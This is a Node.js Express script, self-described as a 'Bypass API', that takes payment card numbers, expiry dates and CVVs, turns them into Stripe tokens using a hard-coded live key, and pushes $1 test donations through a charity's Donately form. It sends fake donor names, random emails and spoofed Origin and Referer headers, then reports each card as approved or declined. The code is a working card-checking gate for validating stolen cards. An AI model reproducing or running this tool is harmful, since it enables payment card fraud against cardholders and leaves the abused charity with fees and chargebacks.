const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());

// --- FRESH 2026 DONATELY CONFIG ---
const DONATELY_PK = 'pk_live_51MjJGSR9Gtt0ccXJYNHerVaATXNyK4JYPRgU8goQDtrLcnk7YZ8OL7uhrQF3BJaS8vT8dPoKj0Wc9JlwSwRiKs00QjccZOMX';
const DONATELY_ACCOUNT = 'act_f9b102ae7299';
const DONATELY_FORM = 'frm_5cb29a5d6955';

app.get('/', (req, res) => res.send('<h1>Hybrid Bypass API Online</h1><p>Use /chk?card=num|mm|yyyy|cvv</p>'));

app.get('/chk', async (req, res) => {
    const cardParam = req.query.card;
    if (!cardParam) return res.send('❌ Error: No card data.');

    const [num, mon, year, cvv] = cardParam.split('|').map(i => i.trim());
    const fullYear = year.length === 2 ? `20${year}` : year;

    try {
        // STEP 1: Generate Legacy Token (Bypasses Surface Error)
        const tokenRes = await axios.post('https://api.stripe.com/v1/tokens', 
            new URLSearchParams({
                'card[number]': num,
                'card[cvc]': cvv,
                'card[exp_month]': parseInt(mon),
                'card[exp_year]': parseInt(fullYear),
                'key': DONATELY_PK
            }).toString(),
            { headers: { 'Origin': 'https://js.stripe.com', 'Referer': 'https://js.stripe.com/' } }
        ).catch(e => e.response);

        if (tokenRes.data.error) {
            return res.send(`<h2>❌ Token Error</h2><p>${tokenRes.data.error.message}</p>`);
        }

        const tok_id = tokenRes.data.id;

        // STEP 2: Hit Donately API for the final bank result
        const chargeRes = await axios.post(`https://api.donately.com/v2/donations?account_id=${DONATELY_ACCOUNT}&donation_type=cc&amount_in_cents=100&form_id=${DONATELY_FORM}`, {
            first_name: "Richard",
            last_name: "Biven",
            email: `don_test${Math.floor(Math.random()*9999)}@gmail.com`,
            payment_auth: JSON.stringify({ stripe_token: tok_id }),
            form: JSON.stringify({ version: '5.8.117', id: DONATELY_FORM })
        }, {
            headers: { 'Content-Type': 'application/json', 'Referer': 'https://www-christwaymission-com.filesusr.com/' }
        }).catch(e => e.response);

        const data = chargeRes.data;

        // --- RENDER HTML RESPONSE ---
        let isSuccess = data.donation || (data.status && data.status === 'succeeded');
        let statusColor = isSuccess ? 'green' : 'red';
        let resultTitle = isSuccess ? '✅ Approved' : '❌ Declined';
        let message = data.message || (data.error ? data.error.message : 'Transaction Declined');

        res.send(`
            <div style="font-family: sans-serif; padding: 20px; border: 2px solid ${statusColor}; border-radius: 10px; max-width: 400px; margin: 50px auto; text-align: center;">
                <h1 style="color: ${statusColor};">${resultTitle}</h1>
                <p><b>Card:</b> ${num}</p>
                <p><b>Bank Response:</b> ${message}</p>
                <hr>
                <small>Bypass Gate: Donately-Legacy</small>
            </div>
        `);

    } catch (err) {
        res.status(500).send(`<h2>❌ System Error</h2><p>${err.message}</p>`);
    }
});

app.listen(PORT, () => console.log(`Bypass API running on ${PORT}`));
